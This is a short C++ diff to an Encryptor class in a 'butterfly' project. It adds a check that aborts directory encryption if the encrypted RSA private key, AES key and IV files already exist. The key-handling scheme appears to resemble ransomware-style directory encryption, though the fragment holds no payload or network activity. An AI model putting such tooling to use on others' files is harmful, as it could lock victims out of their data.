@@ -56,8 +56,24 @@ void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
 
 }
 
+void Encryptor::checkIfEncryptionFilesExists()
+{
+    if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
+    {
+        #ifdef LOGGING
+        LOG_ERROR("Aborting encryption because encryption files (" << butterfly::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::ENC_AESKEY_FILENAME << ", " << butterfly::RSA_EKIV_FILENAME <<") already exists!")
+        #else
+        std::cerr << "Aborting encryption because encryption files already exists!" << std::endl;
+        #endif
+        exit(1);
+    }
+}
+
 void Encryptor::invokeDir(const std::string &dirPath, bool protection)
 {
+    // Ensure that no encryption files already exists!
+    checkIfEncryptionFilesExists();
+
     // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
     encryptCPrivateRSA();
 
